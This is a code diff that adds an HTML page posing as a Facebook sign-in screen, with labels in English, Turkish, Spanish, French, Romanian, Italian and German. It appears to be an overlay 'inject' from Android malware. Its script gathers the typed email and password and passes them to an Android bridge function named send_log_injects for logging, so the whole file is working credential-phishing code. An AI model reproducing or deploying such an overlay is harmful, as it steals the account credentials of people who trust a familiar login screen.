@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>    
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"></title>
+    <style>
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        section {
+            flex: 1;
+            padding: 15px;
+        }
+
+        label {
+            font-size: 18px;
+            font-weight: 600;
+            color: #394247;
+        }
+
+        .input {
+            width: 100%;
+            border: 0;
+            border-bottom: 1px solid #a5a5a5;
+            margin-bottom: 25px;
+        }
+
+        .input:focus {
+            border-color: #10d078;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .button {
+            padding: 10px;
+            width: 48%;
+            background-color: #04c068;
+            border: 0;
+            border-radius: 6px;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .button:disabled {
+            background-color: transparent;
+            color: #b4bdc7;
+            border: 1px solid #b4bdc7;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+    </style>
+</head>
+<body ng-controller="c1">
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABDgAAADwCAIAAABqhkMSAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6N0VCN0M4RUVBNUEyMTFFQUJGRkI4Q0MxMzRBRjhFODIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6N0VCN0M4RUZBNUEyMTFFQUJGRkI4Q0MxMzRBRjhFODIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo3RUI3QzhFQ0E1QTIxMUVBQkZGQjhDQzEzNEFGOEU4MiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo3RUI3QzhFREE1QTIxMUVBQkZGQjhDQzEzNEFGOEU4MiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PmGN9jIAABqBSURBVHja7d2Jd1T1ocDx92897bNWC4IIKBQVFcW6UbVaKZWiti7Vtlqf1rVarRtatT6ftcoWliRA9p3sO9lXEkJ2Avou5h0aM3eGSSYkE/h8zj09Ue+9c+fOpOf3zd3+41sAAIAk8x92AQAAIFQAAACECgAAIFQAAACECgAAIFQAAACECgAAIFQAAACECgAAgFABAACECgAAgFABAACECgAAgFABAACECgAAgFABAACECgAAgFCZI4ODg2+/vz2Ygh98kAAAIFQWXk1t3ZJVa//ziquC6da77/VBAgCAUEmiSpmcvt6d4rMEAAChkkSVIlQAAECoJF2lXLd+gw8SAACEShJVypKVa4J/74MEAACholIAAICLPlRUCgAACBWVAgAACBWVAgAALJZQUSkAACBUVAoAACBUVAoAALCIQuW69RtUCgAACJUk8vXuFJUCAABCJelDZdVaoQIAAEJlgYWc+qVVAABAqCysMxfTr1yjVQAAQKhoFQAAQKhoFQAAYNGFilYBAACholUAAACholUAAIDFGypaBQAAhIpWAQAAhEpirbLmplt9kAAAIFSSrlW+3p3iswQAAKGSXK0iVAAAQKgkRatct37DZKVsuOtnPkgAABAqSWFwcPDt97YHU/CDDxIAAIQKAACAUAEAAIQKAACAUAEAABAqAACAUAEAABAqAACAUAEAABAqAACAUAEAABAqAACAUAEAABAqAAAAQgUAABAqAAAAQgUAABAqAAAAQgUAABAqAAAAQgUAAECoAAAAQgUAAECoAAAAQgUAAECoAAAAQgUAAECoAAAAQgUAAECoAAAACBUAAECoAAAACBUAAECoAAAACBUAAECoAAAACBUAAAChAgAACBUAAAChAgAACBUAAAChAgAACBUAAAChAgAACBUAAAChAgAAIFQAAAChAgAAIFQAAAChAgAAIFQAAAChAgAAIFQAAACECgAAIFQAAACECgAAIFQAAACECgAAIFQAAACECgAAIFQAAACECgAAgFABAACECgAAgFABAACECgAAgFABAACECgAAgFABAAAQKgAAgFABAAAQKgAAgFABAAAQKgAAgFABAAAQKgAAgFABAAAQKgAAAEIFAAAQKgAAAEIFAAAQKgAAAEIFAAAQKgAAAEIFAABAqAAAAEIFAABAqAAAAEIFAABAqAAAAEIFAABAqAAAAEIFAABAqAAAAAgVAABAqAAAAAgVAABAqAAAAAgVAABAqAAAAAgVAABAqAAAAAgVAAAAoQIAAAgVAAAAoQIAAAgVAAAAoQIAAAgVAAAAoQIAACBUAAAAoQIAACBUAAAAoQIAACBUEjE0PFpYVrM/o3BXas7eQ/mZBeVdvf2+BywiTS2tv/nd769bv+Hy5StXrL3x3oe2ZObk2i0AgFBZeCOjY/0Dg0Fg9Bw7PnBiaPzkRJwLnj59Oj275Ov9WVOnXWk5wdp8FZhPnV1dZRWVGVk5uQWF1bV1/ccH4lxwfHz85jvu+c8rrpo6/Wj5qoqqansVABAqCxMnlXVNmfllew7mTSuNYNp3uCCrsDyYIXZytHX2Ri4bTCWV9RfhZ19cUZeRXzZtKiyriX8NkYsHU01Di9+rUO0dna+9+famBzZftfon00rjkiuXrb7h5vt/uTWYobyyKsZK9h5Im7bs5PT7P71wEe7S7R9/es8DmyOn7p4e3zcAECrn3dj4ycKy2p2pOaGNETmlZhZV1B4dGh6NXFVNY2voItlFFRfhZ38wpyRk72UVxb+G0J05o9S5SBzr63v8mT/+cNnK0MaInNZtuP3lv/y1ubU1clXvbv8odJEHtvz6ItyxQZ6F7o3WtnbfOgAQKudXz7Hj+w4XxJkoU6edqdkd3cemra2prSt05vwjF+NpM0JlfuQWFK6+4eY4E2XqdNnSFemHM6at7Z9f7QideetvnhQqQgUAhMo86Tt+IiXsRK94ppRD+adOnZ62wuGR0d3puZEzN7d3CRWhcj6UlJYtu3bdLColmK5ec8PI6PQDg8EQfMnKNZEzf7Vzt1ARKgAgVObD6W++Scsunl2lBFNpVUPoalvau/ceyp964KW85ujF+dkLlfNtYmJi/ca7ZlcpwfTciy+H7/bdKdesW//vAy9XXfPn1964OPewUAEAobIAaqNcTxLPtONA9sDgcPTh46nu3v6m1s6Wju6R0bGL9rMXKufbex99POtK+cGSq2vrG6KteXBoKCs374uvduzcs7ezq+ui3cNCBQCEygI4lHskdBy8Jz23vKaxtaOn7/iJnmPHgx8qao9mF1bsTvv3OV3BP/pohcqCu33T/aHD6CWr1rz46l9279tfWl6RW1C4K2XfK2+89fMtW69Yce3ZeYJ/tAOFCgAIlaQzMjq+40B25CB4f0bh8Mho6CKnTp1ubu/KKarYmZod1IuPVqgsrM6u7h8suTpyDH3d+g3RhtEjo6Nf7dz94MPbLrvqmiBj7EOhAgBCJel09/aHDoIbms89/ohxNtf4yYmjLR2R0/ETQ+dc7bH+EzUNLflHqjPyy9JzSoIBffC/WYXlReW1VfXNoaudnDp7+mJswNT/Oqmj+1hpVUOw5vTsM69yKPdIdlFFec3Rrt7+RR0qITu/tfP0N99MnSd4jyWV9Zn5ZWnZxenZxcFOKK6oi9xFi0JWbl7oGPrjzz6PI3Kins3Vf3zgf/75r8ipsvrcfVhcWvb2+9u3Pf7UPQ9s3nDnputv/ektd9xz3+aHn3jm2Tfefjd0tZPTwYysGBtwKDNr2gulHcp47sWX73voVzffcU/wKrdvuv+BLb9++fU3M3NyFzZUkmrjAYBFGSot7d2hg+CgFhJZ7cDgcOhqaxtbYyzV1NYVOqaPcwpG2zE24EBm4dRECTohxqqCaJnDUfs8h0rozj97C+lj/QOH80qjvfGgW7rnutPOt693p4SOoYNaSGS1NXX1oat998O/x1jqy6933nr3vZdcuWx2F8zc/8utMTZg7c0bz/7X1IOHg8F9jFUF4/7INpi3UEmqjQcAFmWotHb0hA5Y2zp75zNUxk9O5BZXzjpR4gmVYJo8nlNa1bDjQFzPh6lvartgQqWksn7y4556iVG0GyTUHW1bRL9au1L2hQ529x5Im89Q6T8+sHnbY7O+pj+eUAmmyeM5z7348qVxtNBlS1d8+MlnSRIqC7jxAMCiDJXe/oHQ0WpOYo+Qn1GoTJw6lZlflmClxBMqVfXNwTSje5q1d/UmvpOTIVSCl+vtG9iVlhPnGz/a2jm337SxsfFg5+cUVWYWlOUfqT7a0jHtbLRZKywuCR3pPvjwtnkLleHhkU0PbE6wUuIJlTffeS+YZnRPswPpB5MkVBZq4wGARRkqJ09O7EoNH7wWlddGPsnxfIRKWXVjtOHy5KUj+zMKzzWwzkrLKq5paIm9AXvSc0PvHBBj2ne4IPHxdDKEyplHc87kmZ6703OHhkfn6mvW3dufMuWhOmfPrxsZHU985QMnTly+fGXoSPeJZ56NfJLj+QiVF155PXTmS3+8fPLqi2tv3BB7UH7plctu3Hjn3z74MPYGLFm1JvTOATGm1TfcMjExkQyhslAbDwAsylAJ5BRFPecqNbNods+Sjz9UhkfGQv/MHwzup15539F9LHKkOzlbY0tHsJI4N2AWU7D+CyNUZjrlH6meky/Y+MmJvWGf3XcH7irn5CV+sfWRaCPddRtun92z5OMPlbb29iuuXh0556133zv1yvu0QxlXr7khdLZ//O8/g5XEuQGzmD774stkCJWF2ngAYLGGSntXb+wBazDObmnvPk+hUne0LfTP+ZHtEbqd0Y54nHOwnp5TUlXf3NbZ09XT19DckRH93LOc4kQH00kVKrtScwrLapvaurp6+1s7eo5U1gd7O9oRrWi3qJ6R2qOxnigaz43gzml/2sHY169vuOtnX+9OOU+hsv2Tf4QcPVi5JrI99qWmR865ct1NoQcNzjnW33DnpjffeS9lf+rhrOxPP//inujnnj209dFkC5X53HgAYLGGSiD/SPU5/76ell3c3Bbv0ZX4QyWvpCpytoLS8CH4gbBzwEKf5RJ7sF5eczRykWDcH+3srwsmVFIO5h3rH5g2f//AYLSzwoKWS/zbFW3HztUBq0nbnvjdOf82f9Ptd/0r7qMr8YfKrx59PHK2R598OnS1a2+6LXLm3Xv3z3Ss/+fX3ohc5LdP/yF05lXX35RUoTLPGw8ALOJQGRsbT4/vvsDBmPvsjW7nJFRCb5U79WqTqULPUiurbpzRYD3a6Ubj4ydDjy3sOJCV4GUqyRMqjc3hVXC0tTN0/uDTSfzblRvWonHesTp+vb3HbrnjnnhOJbr17nvTDmXMYajced+DkbNNvdpkqtCz1F545fUZjfWDlYSuvK+/f8nKNaEXwCR4pccchsr8bzwAsIhD5dvvnt6Ynl0S3y2hzhzxCNpmTkIlLbs4/vF08LqhF/3PaLDe03c82mbnRLlFcuR5aIsxVFIO5sUorn2HC0JvP5D4Vyv28br6pjl7tHlnV9fN8bVKMPZ99Mmng7aZk1BZv/GuyNn+8fk/Q1cbvG7oRf8zGuvnFUT98mz+dfgtkiPPQ1uoUJn/jQcAFneoBCYmTgWD/nieMTL5/MTIk4hmESoHc4+EzHY0/K/sWYXlkTMfqWqIfwNin8dVXnP0fFxHkSShkh3zltOhERhMwdoS/F5V1jXF+CJ1Hzs+h9/hwaGhYNB/aXzPW1x788aikiOJh8ptd98bOdv7H30Sutr7f7k1cuZnX3gp/g1YfcPNMfbAn197I3SpqZf1L2CoLMjGAwCLPlQmdfX0HQqLh7A/t+f19g0kGCqh5wWFHiQJhD5OvjrsOopoGxD7+TA1DS2hS/UPDF4AoRJadGdFe8JMW2dPwvEwEu0W2OnZxefjO3w4K3vjPffF0ypLV68tKC5JMFS2PPLbkIMkv382dLXXbwh5Ivtf330//g2I/XyYv33wYehSFVUJ3cNtrkJlQTYeALhAQmVSS0d3PLmy73DB2PjJREKlprE17CSl/PGI1Ua7O1nogZ1oGzD5gPZoQm9BdsGESmVdU4yXaGrrCl1qTp782NjSEfkEm++u7D9x/r7DO/fsjSdXVq676VhfXyKh8u72jyJnW77m+r7+/mlz7k87GLrO0AM70TYgaIYY73r7x58mc6gsyMYDABdUqJxtg9CL3b839K+oTyRURkbHdqeFXMKeXVgxNYGCFaZmFsU/3I+2ARW1TRdtqNTEvGy9taMndKlgn8zJd6n72PHckqr9GYVBhQbvvbiibnBoZB6+w/tS03/6s5/HbpVnwkbP8YdKZ1fXFSuujZzz51u2Tk2g2vqGdRtuj5zt+g0/ndFY/9U331q8obIgGw8AXIChcnYIG3rO1dlnnpw8OTHrUPk2+pUhe9LzcooqCkprMgvKo507FO0BL9E2oDrK/cTmP1QOZMYbKhMTp+YoVFpiR2n4UjH32GKxK2Vf6DlXZ595MnDixKxD5dvoF1csXb32wYe3Pfrk0/c+tOXy5StD59mxJ2VGY/233v1g8YbKgmw8AHDBhkrg1KnTReW10Vol8kkmMwqV0998E6TILB6dXlxRF22DZ7QB5ztUQk+i23soP87FB4dGQrcq2pU80d57VV2sh6I0t3ef1yMqC25kdPSJZ56N1iqRTzKZUahMTEwEKTKLx67/7tnno23wjDZgsYTKgmw8AHAhh8qkaDeGinx+4kw7YWLiVLSVR3toeuxLw5MqVLILKyLXuTM1O8i/eBbv7OkL3arSKHsg2nsvjbnH6pvaz981Kskj9O7AwfTy628mONQeHBoKVn5JfDccO3OL5B8vD73Zl1ARKgAgVGZseGQs8pLo0CMbs+uEOFvlUO6Rrp6+2JuaVKES7UEiXb398SxeHeVeZNEeGx/tveeWVMV4lSBjEtnIxaKtvT0ohJAjG398fk6G2tFCaOoUxMztm+4/nJUde1OFilABAKEyAykH885HqIyOjU+7aj94oT3peTtTs3em5gQ/H8gozC6qKK852nc8rvtEJVWoVNQencUtyM6Kdj+D9q7eGb332FfFRHuV0ZhP9lyMll237nyESndPz7RH1C+7dt3S1WsvW7rih8tWBj+vvem2B7b8+qXX3ywtr4hnO4WKUAGAizpUahpauuP+k/nY2HjoEZVgIJ5IJ5w+fTr9+5eb788oHBlNaHycVKHSc+x4tLsFDA2Pxl422jXuu9JyxiPuYRD7vX93K+fwzBscHgmaMHL+4INI/l+tt9/fnpWbF+fMvb3H/mvpisih8CtvvJXIUHt8fHzDnZumznbd+g2dXd0J/W4KFaECABdzqEz+HT3ohJrGlnO2QWl1Q5yXMcyoEyLzoKy6McH3lVShEth7KD/aaWwjo2NRR9V9A9EWzCmqnOl7D6aswvLQRaKddFdQuggGiJPHMYJOeOeDj87ZBs+/9GroUPh///V1IkPtD/7+ybTZXnjl9UT/iCBUhAoACJWzl3dn5pdV1TV3dB+bmDg1dbZgpF5YFj6W3ZWaE/lwxhl1QuQlHMHw/ZyHGhZXqEQ7++vMSW6H8oP/OvVYx+lvvunq7S+uqIt2U+Zg6ox+lU6MUAmmYG9PPZsreK0gC+O/n1vShsrkdNnSFZse2PyXt99JP5wxODT0vY+gqvq3T/8h9GL3y5evjHw444yG2tsef2rabBvvua+5tVWoCBUAECpzECrTbqu199CZB/OlZhWnHMyPMfDNLa5MsBMKSqtDNyAtuzizoDy7qGLqFLxcQWlNaXVDc1tXjENAyRYqJ09ORDs2MiUUz1yNE0yh59d972mYRRWziLSpp40FRRoUS05xZYyt2p9RGGTM4gqVqdN/LV2xYu2N19/60xtuu2P5mutjXN3+y0d+k+BQ+5Enng7dgPUb77r3oS0P/mrb1Gnztscee+qZ51969csdu2IcAhIqQgUAhErWrKfdabknhoYT7IQgOWb36rtSc/JKqhLfgHkIlUBLR/c5CySeKUiL4ZHRREIlzqm+qX1R/GpFC5U4pytWXFvf0JjgUDtIjtm9+uXLVz782OOJb4BQAQCEyvcOejS2dMxorBytE3KKKhOJpbbO3uQPlTOjt8bWBONhT3peb99A7FeZk1DJyC9dLL9aiYTKD5Zc/dkXX87JUPsXWx+Z9WZcec21ew+kCRWhAgBCZQ5CZVdqTrRKmUUnTJw6VVxeN+sDDrvScqbdtjg5QyUQ7LSgrGb3NtOyiuO5O3O0997a0RPsqHheaH9G4fDI2AUfKpcvXxmtUmYx1B4eHnnqj38KfUhLXAd2rl497bbFQkWoAMBFHSrB0DwYlc50xBzkTeyx+4w64cTQcEll/Sw2I8ZlG0kbKt9+d2eCrMLyHQdmctQoPbe85ui0OxzMdOcHkdPe1ZtyrktlDuaUDA6PLKJfrWB0e+2NG2YaBkHelFVUxljtjIba9Q2Nf3j+xVlsxtTpwV9tEypCBQCEyve0dvQUldceyCw659URBaU18TyqPP5OqG5oiXFvq/innanZU28+lsyhMinIhmCfp2YWxSiWYM8ETVjT2Bp5X7VZ7PzJW3iNjo0Xl9eFPrgzaMWahpZFcQF9pN179z/xzLM/uWVj6H29zk4r1t746JNPZ2TlnHOF8Q+133r3g8uXr0wkUf7/lmVXXTP15mNCRagAgFD5t2BAHHRIfVN7VX1zec3R0qqGitqmYKDc3NY1ODT3f2UPXiI0OXKKKsuqG2uPtgblMDkFP1fXNwfbk1VYHu38pWhPak9yI6PjLR3dk/u8tLoheONVdc2NZ+4RfXzi1KlZrDBaqEy9OD6okWB3BdkWfATBFPxwzktfFotgrB90yN//8fkbf3vvz6+98aeXXnn1zbfe3f7Rlzt2NTY1zfnLBS8RkhxLV/xi6yP//fJr73/0STD4npyCn//67vvPvfjyfZsf/tHyVaEj8v1pB/1/JQAgVBZYT9/xyItSDueVBuPs2AsODY+mZhVHDsRjXDNzUZnd0SRmIa+gKPKilDvve7Cmrj72gk0trTfcdkdkqMS4ZgYAQKjMk8inoe85mDc2Nh7PsvVN7ZED8abWTntVqMynx556ZlppXLX6J729x+JZ9qNPP4sMlS++2mGvAgBCZYGlZU8/KpIT8zmGUzU0h4RKdxwXzwgV5tD6jXdNvyD+4W1xLvvxZ59HhkpWbp69CgAIlQUWeZuvjPyyOJcN5oy8Q/GMrjgXKiQu8jZfd//8oTiXDeactuyPlq+aejE9AIBQWRgHc0oinyB5zgviR0bHckuqIkfhwb+0S4XKPLv17nsjnyC5LzU99lKdXV1bHvlt5OGU4F/apQCAUFl4ReW1obf8Kqmo6zl2fNpNck8MjTS1dhaU1uxOzw1dKljELhUq8+yJ3z8besuvp5/779yCwomJiakzNzQe/eKrHY899cyPr7kudKlgEbsUABAqC6+3byDGo+iD9th7KH/f4YKUg3nBz7EfolJV32x/CpX5V1BUHONR9Jdddc2KtTeuuv6mZdetC36O/RCVN/72nv0JAAiVZFFa1ZDgcx6D1Kmsa7InhcpCee7FlxN8zmOQOq+/9Y49CQAIleRypLJ+1pVyILNo8mnrCJUF9McXXrrkymWzq5Sf3LJxV8o++xAAECrJqL2r91DukRkdRQnmr29qm3YdC0JloRxIP3j7pvvj75MfLLk6mP/DTz6bdh0LAIBQSTr9A4OVdU05xZVpWcV70vN2puZ81yRn7juccjBvf0ZhZkF5cUVdfVP78MiY3SVUklBFVfXrb73z0NZHb9x459LVa3+4bOUlVy679MplP1q+atm169bcdOvPfrHld88+/9Gnn7W1t9tdAIBQWawcMJm1iVOnIif7cwE+CAdMAAChAgAAIFQAAAChAgAAIFQAAAChAgAAIFQAAAChYhcAAABCBQAAQKgAAABCBQAAQKgAAABCBQAAQKgAAABCBQAAQKgAAAAIFQAAQKgAAAAIFQAAQKgAAAAIFQAAQKgAAAAIFQAAQKgAAAAIFQAAAKECAAAIFQAAAKECAAAIFQAAgPPq/wCf+jVnb5iRgwAAAABJRU5ErkJggg==" alt="">
+        </header>
+        <section>
+            <label for="login">{{t.__text1}}</label>
+            <input type="email" class="input" id="login" name="login" placeholder="{{t.__text2}}" required autocomplete="off">
+
+            <label for="password">{{t.__text3}}</label>
+            <span style="float:right;color: #04c068;font-size: 14px;font-weight: 600;">{{t.__text4}}</span>
+            <input type="password" class="input" id="password" name="password" placeholder="{{t.__text5}}" required autocomplete="off">
+        </section>
+        <footer>
+            <div style="padding: 10px 20px">
+                <input type="button" class="button" disabled value="{{t.__text6}}">
+                <input type="submit" class="button" style="float: right" id="sendData" value="{{t.__text7}}">
+            </div>
+
+            <p style="text-align: center;font-size: 10px;color: #8a9398;font-weight: 600;">{{t.__text8}} <span style="color: #10d078;">{{t.__text9}}</span></p>
+        </footer>
+    </form>
+    <script>
+        var login = document.getElementById('login'),
+            password = document.getElementById('password'),
+            sendData = document.getElementById('sendData');
+
+        sendData.onclick = () => {
+            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
+                login.classList.add('error')
+            } else {
+                login.classList.remove('error')
+            }
+
+            if(password.value.length < 5) {
+                password.classList.add('error')
+            } else {
+                password.classList.remove('error')
+            }
+
+            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length > 5) {
+                var data = {};
+                data.email = login.value;
+                data.password = login.value;
+                data.type_injects = "crypt";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+            }
+        }
+    </script>
+    <script>
+        var text, 
+            link = "facebook.com", 
+            appname = "Facebook", 
+            texts = { 
+                en: { 
+                    __text1: "Email",
+                    __text2: "Enter your email address",
+                    __text3: "Password",
+                    __text4: "Forgot password?",
+                    __text5: "Enter your password",
+                    __text6: "Skip",
+                    __text7: "Sign In",
+                    __text8: "By signing up, you agree to the ",
+                    __text9: "Terms & Privacy Policy",
+                }, 
+        
+                tr: { 
+                    __text1: "Posta",
+                    __text2: "E-posta adresinizi girin",
+                    __text3: "Şifre",
+                    __text4: "Şifremi unuttum?",
+                    __text5: "Şifrenizi girin",
+                    __text6: "Atlamak",
+                    __text7: "giriş yap",
+                    __text8: "Üye olarak, kabul ",
+                    __text9: "Şartlar Ve Gizlilik Politikası",
+                }, 
+                
+                es: { 
+                    __text1: "Correo",
+                    __text2: "Introduzca su dirección de correo electrónico",
+                    __text3: "Contraseña",
+                    __text4: "Recuperar contraseña",
+                    __text5: "Introduzca su contraseña",
+                    __text6: "Saltar",
+                    __text7: "Inicio de sesión",
+                    __text8: "Al registrarse, usted acepta el ",
+                    __text9: "Términos y política de privacidad",
+                },  
+        
+                fr: { 
+                    __text1: "Courriel",
+                    __text2: "Entrez votre adresse e-mail",
+                    __text3: "Mot de passe",
+                    __text4: "Mot de passe oublié?",
+                    __text5: "Entrez votre mot de passe",
+                    __text6: "Sauter",
+                    __text7: "Signe Dans",
+                    __text8: "En vous inscrivant, vous acceptez les ",
+                    __text9: "Conditions Et Politique De Confidentialité",
+                }, 
+        
+                ro: { 
+                    __text1: "E-mail",
+                    __text2: "Introdu adresa ta de e-mail",
+                    __text3: "Parola",
+                    __text4: "Ai uitat parola?",
+                    __text5: "Introdu parola",
+                    __text6: "Treci",
+                    __text7: "Conectați-vă",
+                    __text8: "Prin înscriere, sunteți de acord cu ",
+                    __text9: "Termeni și Politica de confidențialitate",
+                }, 
+        
+                it: { 
+                    __text1: "Email",
+                    __text2: "Inserisci il tuo indirizzo email",
+                    __text3: "Password",
+                    __text4: "Hai dimenticato la password?",
+                    __text5: "Inserisci la tua password",
+                    __text6: "Saltare",
+                    __text7: "Accedi",
+                    __text8: "Con la firma, l ' utente accetta la ",
+                    __text9: "Termini E Politica Sulla Privacy",
+                },  
+        
+                de: { 
+                    __text1: "Email",
+                    __text2: "Geben Sie Ihre E-Mail-Adresse ein",
+                    __text3: "Passwort",
+                    __text4: "Passwort vergessen?",
+                    __text5: "Geben Sie Ihr Passwort ein",
+                    __text6: "Überspringen",
+                    __text7: "Anmelden",
+                    __text8: "Mit der Anmeldung Stimmen Sie dem ",
+                    __text9: "AGB & Datenschutz",
+                }, 
+            }
+
+            var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);
+    </script>
+</body>
+</html>
